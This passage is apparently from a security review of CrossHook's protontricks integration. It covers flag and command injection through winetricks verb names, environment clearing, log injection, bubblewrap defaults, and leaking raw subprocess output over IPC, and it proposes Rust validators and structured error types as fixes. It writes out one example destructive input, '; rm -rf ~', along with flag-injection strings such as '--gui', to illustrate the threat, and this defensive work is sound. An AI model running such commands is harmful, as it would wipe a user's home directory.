**Severity: WARNING**

The existing `apply_host_environment` function (`runtime_helpers.rs:153`) forwards:

- `HOME`, `USER`, `LOGNAME`, `SHELL`, `PATH`
- `DISPLAY`, `WAYLAND_DISPLAY`, `XDG_RUNTIME_DIR`
- `DBUS_SESSION_BUS_ADDRESS`

This function was designed for Proton/Wine game launch — those processes legitimately need D-Bus for system integration. Protontricks also needs most of these to function. However:

1. **`steamgriddb_api_key`** is stored in `AppSettingsData` in memory and only accessed via Rust code — it is NOT exported as an environment variable, so it cannot be leaked via env inheritance. **Confirmed safe.**
2. **`DBUS_SESSION_BUS_ADDRESS`** is needed by protontricks for Wine's D-Bus access. Forwarding it is correct behavior.
3. **Risk**: Any CrossHook-internal env var prefixed `CROSSHOOK_*` or any secrets loaded from `.env` via dotenvx that land in the process environment would be inherited if CrossHook uses `env_clear()` + `apply_host_environment()`. The mitigation is strict: call `env_clear()` first, then explicitly restore only the vars in `apply_host_environment` — do not add any CrossHook-internal variables to that allowlist.

**Required:** Protontricks runner must call `cmd.env_clear()` before `apply_host_environment()`. It must NOT forward any `CROSSHOOK_*` variables. This is a code review checklist item, not a structural gap.

**Confidence: High** — `steamgriddb_api_key` is confirmed in-memory only (not env var). `apply_host_environment` content confirmed at `runtime_helpers.rs:153-167`.

### 10.5 S-18: Log Injection via Control Characters in Verb Names or Prefix Names

**Severity: ADVISORY**

If CrossHook logs the verb names or prefix path from a community profile before validation, a malicious profile could embed ANSI escape sequences (`\x1b[...`) or newlines (`\n`) in those strings to forge log entries or corrupt terminal output.

**Mitigations:**

1. The structural regex `^[a-z0-9][a-z0-9_\-]{0,63}$` applied to verb names rejects all control characters — validated verbs are safe to log.
2. Log verb names only after validation, never before.
3. For prefix paths (user-controlled, not from community TOML), use `%path.display()` in tracing spans which handles non-printable characters via Rust's `Display` impl for `Path`. No additional mitigation needed.

**Confidence: Medium** — Log injection is a real class of attack but the structural regex addresses it for verb names. Prefix paths from Steam discovery are not attacker-controlled.

### 10.6 S-20: `user_extra_protontricks` — Same Allowlist Required

**Severity: WARNING**

The business research identifies a `user_extra_protontricks: Vec<String>` field in the user's own TOML profile (not community-shared). The user controls this field directly. While the threat model is different from community profiles (the user is deliberately adding verbs), the same allowlist validation must be applied before any subprocess call for two reasons:

1. **Typos and mistakes**: an accidental space or special character in a user-entered verb would bypass validation silently if not checked.
2. **Consistent validation boundary**: having one code path that validates and one that does not creates maintenance risk — the non-validated path will eventually be called from a context where validation was assumed to have already occurred.

The risk classification differs from S-03 (community TOML): this is user-intent data, not attacker-controlled. The severity is WARNING rather than CRITICAL because the user is the only potential victim of their own misconfiguration. However, since `run_protontricks()` is a shared function, it must enforce validation regardless of the call site.

**Required mitigation:** `validate_protontricks_verbs()` must be called before `run_protontricks()` for **all** verb sources — community profile, user extra, and any future source. The runner itself should assert verbs are valid (structural check only, lightweight) as a final defense-in-depth layer.

**Confidence: High** — Same code path, same subprocess, same injection surface regardless of verb origin.

### 10.7 S-21: Flatpak `protontricks` Binary Path Requires `flatpak run` Invocation

**Severity: WARNING**

The business research notes that `protontricks_binary_path` should not be a shell script invocation string with spaces/arguments baked in (e.g., `flatpak run com.github.Matoking.protontricks`). This is a real complexity: the Flatpak invocation is not a path to an executable — it is a command with arguments.

**Two valid approaches:**

1. **Separate detection path**: CrossHook detects whether protontricks is installed as Flatpak or system binary during onboarding/health check. If Flatpak is detected, the runner uses `Command::new("flatpak").arg("run").arg("com.github.Matoking.protontricks")` hardcoded — not a user-provided string. The `protontricks_binary_path` setting only applies to the system binary case.

2. **Structured binary config**: Instead of a single `protontricks_binary_path: String`, use a structured setting:

```rust
pub enum ProtontricksInvocation {
    SystemBinary(PathBuf),  // validated via check_required_executable
    Flatpak,                // always invokes flatpak run com.github.Matoking.protontricks
}
```

**Why a free-form string is dangerous here:** If `protontricks_binary_path` is set to `flatpak run com.github.Matoking.protontricks` and CrossHook uses `Command::new(binary_path)`, the entire string becomes the executable name — the command fails silently or with a confusing error. If CrossHook tries to split on spaces to support this, it reintroduces a command injection surface.

**Recommendation**: Option 1 (separate detection path with hardcoded Flatpak invocation) is simpler and safer. `protontricks_binary_path` remains a validated executable path used only when Flatpak detection fails.

**Confidence: High** — Standard Flatpak invocation pattern; the split-on-spaces approach is a known antipattern for subprocess invocation.

### 10.8 S-22: Manual Package Name Input — Free-Form UI Field

**Severity: CRITICAL**

UX research identifies a manual install UI flow where users can type a package name directly (e.g., to add a dependency not in the profile). This is a separate input surface from community TOML profiles, and it requires identical validation. A user entering `; rm -rf ~` or `--gui` into a free-form text field and triggering install would be self-inflicted, but the underlying risk is identical: the string reaches `cmd.arg()` and the `--` flag separator + structural regex are the only guards.

**Why CRITICAL despite being user-controlled:** The UX researcher's phrasing "free-form arbitrary strings passed as protontricks arguments" suggests the current UI design intends to pass input directly. That design assumption must be rejected at the security boundary. Even though the user is the only potential victim of their own typo, the code path is shared with the community profile path — any relaxation of validation for the "user entered it themselves" case would create a gap that community profiles could exploit if the call site is ever confused.

**Required mitigation:** The same `validate_protontricks_verbs()` function must gate the manual input field. The UI should:

1. Validate the typed string on blur/submit against the structural regex before enabling the "Install" button
2. Show inline validation feedback: "Package names can only contain lowercase letters, numbers, underscores, and hyphens."
3. Offer autocomplete from the known-verb curated set to reduce free-form entry altogether

The Tauri IPC command handler receiving this input must also validate server-side — client-side validation alone is not a security boundary.

**Confidence: High** — Same subprocess execution path, same `cmd.arg()` call, same injection surface as S-01/S-03.

### 10.9 Shared Argument Validation Utility (from practices review)

**Severity: ADVISORY**

The practices researcher identified that the argument validation pattern is now needed in two places:

- `community/taps.rs`: `validate_branch_name` — git positional args, `[a-zA-Z0-9/._-]`, rejects `-` prefix
- `protontricks/validation.rs` (new): winetricks verbs, `[a-z0-9_-]`, rejects `-` prefix

The structural logic is identical: `starts_with('-')` rejection + character allowlist + length cap. The codebase should either:

1. **Keep them separate** (recommended for now): The character sets and error types differ enough that a shared abstraction would add complexity without clear benefit. Both implementations are small (~10 lines). Duplication here is acceptable.
2. **Extract to shared utility** if a third call site emerges (e.g., validating Proton version strings, profile name arguments).

The key principle to preserve in both validators — documented explicitly so future refactors don't lose it: **reject any string starting with `-` before checking the character allowlist**. This is the flag-injection guard and must be the first check, not implied by the character set (the character set allows `-` in non-leading positions).

**Important difference from `git_command()`:** `git_command()` in `taps.rs` does NOT call `env_clear()` — it only adds security vars on top of the inherited environment. This was an intentional choice for git (needs more host context). The protontricks runner must be stricter: `env_clear()` first, then explicit restoration of only what protontricks needs. Do not copy the `git_command()` pattern directly for protontricks.

**Confidence: High** — Based on direct code review of `community/taps.rs:461-474` and `taps.rs:493-509`.

---

## 11. Architecture Review Findings (tech-designer spec, 2026-04-03)

### 11.1 S-23: `--no-bwrap` Hardcoded by Default

**Severity: WARNING**

The `build_install_command` function in the tech-designer's spec unconditionally passes `--no-bwrap` to protontricks whenever the binary name contains `"protontricks"`:

```rust
if binary_path.contains("protontricks") {
    cmd.arg("--no-bwrap");
}
```

This contradicts the guidance in S-13 and the trade-off table in section 8. bwrap (bubblewrap) provides meaningful process isolation around winetricks' execution — passing `--no-bwrap` by default removes that isolation for all users, including those not running inside a container where it might break.

The AppImage sandbox is not a justification for removing bwrap globally. AppImage's sandbox and bwrap operate at different layers; bwrap wrapping the child process of protontricks is independent of whether CrossHook itself runs in AppImage.

**Required change:**

- Default: do NOT pass `--no-bwrap`.
- Add an opt-in setting `protontricks_no_bwrap: bool` to `AppSettingsData` (default `false`), passed through to the installer only when the user has explicitly enabled it.
- Surface the toggle in Settings UI with a warning: "Disables bubblewrap isolation for protontricks. Enable only if protontricks fails to run in your environment."
- For the Flatpak invocation case, `--no-bwrap` is already superseded by the Flatpak sandbox — do not pass it when `source = "flatpak"` regardless of the setting.

**Confidence: High** — bwrap default-on behavior confirmed in protontricks README. AppImage does not prevent bwrap from functioning.

### 11.2 S-24: `PackageDependencyState.last_error` Reaches IPC/Frontend

**Severity: WARNING**

`PackageDependencyState` is returned directly to the frontend via `get_dependency_status` and emitted in install events. The `last_error: Option<String>` field stores raw error content from the protontricks process. Per S-11 (CWE-209/CWE-211), raw subprocess output must not reach the UI layer.

The `last_error` stored in SQLite may include:

- Full filesystem paths (`/home/user/.local/share/Steam/steamapps/compatdata/1245620/pfx`)
- Wine debug output (containing hostname, kernel version, DLL paths)
- HTTP error details from winetricks downloads
- Stack traces or exception text from protontricks' Python runtime

**Required change:**

1. **SQLite storage**: The `last_error TEXT` column may store a truncated raw snippet for internal diagnostics. This is acceptable; SQLite is not user-facing.
2. **IPC response**: `PackageDependencyState.last_error` returned to the frontend must be either:
   - Removed from the public IPC type (internal diagnostics only), **OR**
   - Replaced with a structured error category enum that the frontend can translate to a user-facing message.
3. The streaming `app.emit("prefix-dep-install-log", { line })` (see S-27) is a separate but related issue — both must be addressed.

**Recommended type change:**

```rust
// Replace Option<String> with a structured variant
pub last_error_kind: Option<InstallErrorKind>,

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum InstallErrorKind {
    ChecksumMismatch,
    NetworkTimeout,
    NetworkError,
    UnknownPackage,
    WinePrefixError,
    ProcessTimeout,
    UnknownError,  // catch-all — no detail string
}
```

**Confidence: High** — CWE-209 directly applies. Pattern: log raw errors internally, surface structured errors at IPC boundary (S-11, section 6.1).

### 11.3 S-25: `BinaryNotFound { searched_path: String }` Leaks Path Through IPC

**Severity: WARNING**

`PrefixDepsError::BinaryNotFound { searched_path: String }` includes the PATH that was searched. This is returned to the frontend as a serialized error string. The `searched_path` value leaks filesystem layout and installed tool locations.

**Required change:**

```rust
// Current — leaks path
BinaryNotFound { searched_path: String },

// Required — no path in public error
BinaryNotFound,
```

Log `searched_path` internally (e.g., `tracing::warn!(searched_path = %path, "protontricks binary not found")`), but do not include it in the IPC error value. The frontend displays: "protontricks not found. Please install it or configure the path in Settings."

Similarly, `SpawnFailed { message: String }` must be scrutinized — if `message` comes from `std::io::Error`, it may contain path information. Map to `SpawnFailed` without a message string, or confirm the message is a controlled template (not raw OS error).

**Confidence: High** — Directly violates the typed IPC error principle from section 6.1. Pattern: `PrefixNotFound` in section 6.1 has no path field by design.

### 11.4 S-26: `DetectBinaryResult.binary_path` Returns Command String, Not Path

**Severity: WARNING**

The detection algorithm in `binary.rs` step 3 returns `binary_path = "flatpak run com.github.Matoking.protontricks"` when Flatpak protontricks is detected. This is not a filesystem path — it is a command-with-arguments string embedded in a field named `binary_path`. Two problems:

1. **Security**: If the installer does `Command::new(&result.binary_path)`, the entire string becomes the executable name and the invocation silently fails (or worse, if later code splits on spaces, it reintroduces command injection).
2. **API contract violation**: `binary_path: String` should be a path or empty — using it as a command string breaks the structural guarantee.

The `BinaryInvocation` struct proposed in the tech-designer's spec is the correct solution:

```rust
pub struct BinaryInvocation {
    pub program: String,                // "flatpak" | "/usr/bin/protontricks"
    pub leading_args: Vec<String>,      // ["run", "--filesystem=host", "com.github.Matoking.protontricks"] for Flatpak; empty for system binary
    pub binary_name: String,            // "protontricks" | "winetricks"
    pub source: String,                 // "settings" | "path" | "flatpak" | "not_found"
}
```

`DetectBinaryResult` should use this struct internally. The `binary_path: String` field in the public IPC response should be either a real filesystem path (when source is `"settings"` or `"path"`) or empty/absent (when source is `"flatpak"` or `"not_found"`). The frontend does not need to reconstruct the invocation — it should only display the source and whether the tool was found.

**Confidence: High** — S-21 (section 10.7) already documents this structural risk. The tech-designer's spec also acknowledges it with the `BinaryInvocation` struct.

### 11.5 S-27: Raw Subprocess Lines Streamed to Frontend via `app.emit`

**Severity: CRITICAL**

The install flow emits raw subprocess output lines to the frontend via:

```rust
app.emit("prefix-dep-install-log", { package: String, line: String })
```

The `line` field is raw stdout/stderr from protontricks/winetricks, which includes:

- Full filesystem paths
- Wine debug output with system details
- HTTP request/response details (URLs, status codes)
- Python stack traces from protontricks

This is a CWE-209 violation at the IPC event boundary — the same class of issue as S-11, but on the streaming events path rather than the command response path.

**Required mitigation:**

The streaming architecture (log file → async reader → `app.emit`) must apply output sanitization before emission. Two acceptable approaches:

**Option A — Structured progress events (recommended):**

Replace line-by-line raw output emission with structured progress events:

```rust
// Emit structured progress, not raw output
app.emit("prefix-dep-install-progress", InstallProgressEvent {
    package: String,
    stage: InstallStage,   // Checking | Downloading | Installing | Done
    percent: Option<u8>,
})

#[derive(Serialize)]
#[serde(rename_all = "snake_case")]
pub enum InstallStage {
    Checking,
    Downloading,
    Installing,
    Done,
    Failed,
}
```

Parse winetricks output patterns to update stage/percent. Unknown lines are discarded (not forwarded).

**Option B — Pattern-filtered output (acceptable fallback):**

Apply a sanitization filter before emitting:

```rust
fn sanitize_install_log_line(line: &str) -> Option<String> {
    // Only forward lines matching safe patterns (verb progress, percentage, etc.)
    // Discard lines containing path separators, hostnames, or stack trace patterns
    let safe = line.chars().all(|c| c.is_ascii_alphanumeric() || " .,:-_()%[]".contains(c));
    if safe && line.len() <= 200 { Some(line.to_string()) } else { None }
}
```

**Option A is preferred** — it decouples the frontend from winetricks output format changes and avoids regex maintenance.

Raw log lines must be written to the debug log file only (CrossHook's internal log, not sent to WebView).

**Confidence: High** — Same CWE-209 class as S-11. Winetricks output is confirmed verbose and path-heavy by API research.

### 11.6 `is_valid_package_name` Missing Leading `-` Rejection (Supplement to S-03/S-06)

**Severity: CRITICAL** (supplement to S-03 and S-06, not a new finding — confirms gap in proposed implementation)

The tech-designer's `is_valid_package_name` implementation:

```rust
pub fn is_valid_package_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 64
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
}
```

This accepts `"-c"`, `"--gui"`, `"-q"` — all protontricks/winetricks flags — because `-` is in the allowed character set and there is no leading `-` check. The `--` flag separator (S-06) provides a second layer of defense, but the validator itself should also reject these.

**Required fix** (matches `validate_verb` in section 7.1):

```rust
pub fn is_valid_package_name(name: &str) -> bool {
    if name.starts_with('-') { return false; }  // reject flag injection
    !name.is_empty()
        && name.len() <= 64
        && name.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '_' || c == '-')
}
```

Note: uppercase letters are also excluded (`is_ascii_lowercase()` instead of `is_ascii_alphabetic()`). All known winetricks verbs are lowercase-only. Accepting uppercase would allow verbs that don't exist in winetricks, leading to confusing errors rather than a clean validation failure.

**Confidence: High** — `validate_branch_name` pattern in `taps.rs:461`. Winetricks verb list confirms all-lowercase naming.

---

## Sources

- [Rust std::process::Command documentation](https://doc.rust-lang.org/std/process/struct.Command.html)
- [StackHawk: Rust Command Injection Prevention](https://www.stackhawk.com/blog/rust-command-injection-examples-and-prevention/)
- [Protontricks GitHub (Matoking/protontricks)](https://github.com/Matoking/protontricks)
- [Winetricks source and verbs](https://github.com/Winetricks/winetricks/blob/master/files/verbs/all.txt)
- [Protontricks README — CLI interface](https://github.com/Matoking/protontricks/blob/master/README.md)
- [Protontricks Snyk vulnerability scan](https://security.snyk.io/package/pip/protontricks)
- [Winetricks SHA256 mismatch issue #1762](https://github.com/Winetricks/winetricks/issues/1762)
- [Protontricks issue #327 — WINETRICKS env var](https://github.com/Matoking/protontricks/issues/327)
- [Protontricks issue #307 — sudo causes crash](https://github.com/Matoking/protontricks/issues/307)
- [smol-toml DoS advisory GHSA-pqhp-25j4-6hq9](https://github.com/advisories/GHSA-pqhp-25j4-6hq9)
- [Winetricks checksum forum thread](https://forum.winehq.org/viewtopic.php?t=35030)
- [CWE-209: Information Exposure Through an Error Message](https://cwe.mitre.org/data/definitions/209.html)
- [CWE-211: Externally-Generated Error Message Containing Sensitive Information](https://cwe.mitre.org/data/definitions/211.html)
